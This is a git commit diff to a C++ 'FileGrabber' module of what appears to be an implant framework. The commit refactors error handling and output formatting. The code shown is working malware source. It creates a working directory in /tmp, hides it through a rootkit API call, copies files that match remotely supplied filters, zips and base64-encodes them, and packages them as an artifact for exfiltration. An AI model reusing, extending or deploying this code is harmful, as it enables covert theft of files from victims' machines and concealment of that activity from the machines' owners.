befe2b7fbd84dfad8c32dadb6311bf20d7079d40
Ben Cohen <benc10128@gmail.com>
2024-08-24 21:56:29 +0300

    [file grabber] better exception handling, prints and added new format for result json

--- Modules/FileGrabber.cpp
+++ Modules/FileGrabber.cpp
@@ -12,72 +12,17 @@
 #include "../Utils/MachineUtils.h"
 #include "../amazing_rootkit/api/api.h"
 
-void FileGrabber::module_impl()
-{
-    // We only want to run once
-    run_ = false;
+using json = nlohmann::json;
 
-    std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;
-    nlohmann::json ret_json;
-
-    const std::string base_dir = "/tmp/";
-    std::string zip_file_name = "out.zip";
-    std::string working_dir;
-
-    try 
-    {
-        working_dir = create_working_dir(base_dir);
-        // hide working_dir using rootkit api
-        hide_filename(working_dir.c_str());
-        std::cout << "Successfully created directory: " << working_dir << std::endl;
-    } 
-    catch (const std::exception& ex) 
-    {
-        // std::cerr << "Error: " << ex.what() << std::endl;
-        nlohmann::json error_msg;
-        error_msg["error"] = "Failed to create working dir";
-        ret_json[module_type] = error_msg;
-        save_artifact(ret_json);
-        return;
-    }
-
-    int total_grabbed_files = parse_tasks(working_dir, args);
-    
-    std::cout << "Grabbed files: " << total_grabbed_files <<std::endl;
-
-    // zipping the working_dir
-    std::string out_zip_path = working_dir + '/' + zip_file_name;
-    if (total_grabbed_files) {
-        if (zip_folder(working_dir, out_zip_path)) {
-            // std::cout << "Zipping successful!: " << out_zip_path << std::endl;
-        } else {
-            std::cout << "Zipping failed!" << std::endl;
-        }
-    }
-
-    if (boost::filesystem::exists(out_zip_path)) 
-    {
-        std::cout << "File exists: " << out_zip_path << std::endl;
-        std::vector<unsigned char> fileContent = readFile(out_zip_path);
-        std::string base64Content = CryptoUtils::base64_encode(fileContent);
-        ret_json[module_type] = base64Content;
-        save_artifact(ret_json);
-    }
-    else 
-    {
-        std::cout << "File does not exist: " << out_zip_path << std::endl;
-        nlohmann::json error_msg;
-        error_msg["error"] = "No zip to send";
-        ret_json[module_type] = error_msg;
-        save_artifact(ret_json);
-        return;
-    }
-
-    //TODO: delete folder from fs
-    //      How can we do it after we hide it?
-
-    return;
+void FileGrabber::send_err(json inner, std::string str){
+    std::cerr << str << std::endl;
+    inner["result"] = "failure";
+    inner["error"] = str;
+    json ret_json;
+    ret_json[module_type] = inner;
+    save_artifact(ret_json);
 }
+
 
 std::vector<unsigned char> FileGrabber::readFile(const std::string& filepath) {
     std::ifstream file(filepath, std::ios::binary);
@@ -102,7 +47,7 @@ std::vector<std::string> FileGrabber::list_files(const std::string working_dir, 
     // List all the files in the directory
     const std::regex regexFilter(filter);
     auto fileList = std::vector<std::string>();
-    
+
     if (root.compare(working_dir) == 0) {
         return fileList;
     }
@@ -138,6 +83,7 @@ std::vector<std::string> FileGrabber::list_files(const std::string working_dir, 
 
     return fileList;
 }
+
 
 std::string FileGrabber::create_working_dir(std::string base_dir) {
     std::string random_dir_name;
@@ -234,7 +180,7 @@ bool FileGrabber::zip_file(zipFile zf, const std::string& file_path, const std::
 bool FileGrabber::zip_folder(const std::string& folder_path, const std::string& zip_file_path) {
     zipFile zf = zipOpen(zip_file_path.c_str(), APPEND_STATUS_CREATE);
     if (zf == nullptr) {
-        std::cerr << "Could not create zip file: " << zip_file_path << std::endl;
+        std::cerr << "[-] Could not create zip file: " << zip_file_path << std::endl;
         return false;
     }
 
@@ -260,31 +206,21 @@ bool FileGrabber::zip_folder(const std::string& folder_path, const std::string& 
     }
 
     zipClose(zf, nullptr);
-    std::cout << "Folder zipped successfully: " << zip_file_path << std::endl;
+    std::cout << "[+] Folder zipped successfully: " << zip_file_path << std::endl;
     return true;
 }
 
 
 int FileGrabber::run_grab_task(std::string working_dir, std::string directory, std::string filter, std::string task_id) {
     int found_counter = 0;
-    
+
     std::string task_dir = working_dir + '/' + task_id;
-    try {
-        boost::filesystem::create_directory(task_dir);
-    } catch (const boost::filesystem::filesystem_error& ex) {
-        std::cerr << "Error: " << ex.what() << std::endl;
-    }
-    
+    boost::filesystem::create_directory(task_dir);
+
     std::vector<std::string> files;
-    try {
-        files = list_files(working_dir, directory, true, filter, true);
-    } catch (const std::exception& ex) {
-        std::cerr << "Error: " << ex.what() << std::endl;
-    }
-    // std::cout << "Files found:" << std::endl;
+    files = list_files(working_dir, directory, true, filter, true);
+ 
     for (const auto& file : files) {
-        // std::cout << file << std::endl;
-        //copy those files to task_dir
         copy_file_to_folder(file, task_dir);
         found_counter++;
     }
@@ -292,18 +228,97 @@ int FileGrabber::run_grab_task(std::string working_dir, std::string directory, s
 }
 
 
-int FileGrabber::parse_tasks(std::string working_dir, nlohmann::json j) {
+int FileGrabber::parse_tasks(std::string working_dir, json j) {
     int c = 0;
 
     // Iterate through the JSON object
     for (auto& [task_id, value] : j.items()) {
         std::string start_path = value["start_path"];  // Get start_path as string
         std::vector<std::string> files = value["files"];  // Get files as vector of strings
-
         for (const auto& filter : files) {
-            // std::cout << filter << " ";
-            c += run_grab_task(working_dir, start_path, filter, task_id);
+            try {
+                c += run_grab_task(working_dir, start_path, filter, task_id);
+            } catch (const std::exception& e) {
+                std::cerr << "Error at task: " << e.what() << std::endl;
+            }
         }
     }
     return c;
+}
+
+
+void FileGrabber::module_impl()
+{
+    // We only want to run once
+    run_ = false;
+
+    std::cout << "Running " << module_type << " with args: " << args.dump() << std::endl;
+    json inner;
+    inner["result"] = "unknown";
+    inner["error"] = "";
+    inner["data"] = "";
+
+    const std::string base_dir = "/tmp/";
+    std::string zip_file_name = "out.zip";
+    std::string working_dir;
+
+    try {
+        working_dir = create_working_dir(base_dir);
+        // hide working_dir using rootkit api
+        hide_filename(working_dir.c_str());
+        std::cout << "[+] created working directory: " << working_dir << std::endl;
+    } catch (const std::exception& ex) {
+        send_err(inner, std::string("Failed to create working dir: ") + ex.what());
+        return;
+    }
+
+    int total_grabbed_files = 0;
+    try {
+        total_grabbed_files = parse_tasks(working_dir, args);
+    } catch (const std::exception& ex) {
+        send_err(inner, std::string("Failed to parse tasks: ") + ex.what());
+        return;
+    }
+    std::cout << "[+] grabbed files: " << total_grabbed_files <<std::endl;
+
+    // zipping the working_dir
+    std::string out_zip_path = working_dir + '/' + zip_file_name;
+    if (total_grabbed_files == 0) {
+        send_err(inner, std::string("not found files to grabbed"));
+        return;
+    }
+
+    bool ret = false;
+    try {
+        ret = zip_folder(working_dir, out_zip_path);
+    } catch (const std::exception& e) {
+        send_err(inner, std::string("zip_folder:" ) + e.what());
+        return;
+    }
+
+    if (!ret) {
+        send_err(inner, std::string("Failed zipping"));
+        return;
+    }
+
+    if (!boost::filesystem::exists(out_zip_path)) {
+        send_err(inner, std::string("No zip to send"));
+        return;
+    }
+    
+    std::cout << "[+] File exists: " << out_zip_path << std::endl;
+    try {
+        std::vector<unsigned char> fileContent = readFile(out_zip_path);
+        std::string base64Content = CryptoUtils::base64_encode(fileContent);
+        inner["result"] = "success";
+        inner["data"] = base64Content;
+        json ret_json;
+        ret_json[module_type] = inner;
+        save_artifact(ret_json);
+    } catch (const std::exception& e) {
+        send_err(inner, std::string("saving zip as artifact:" ) + e.what());
+        return;
+    }
+
+    return;
 }
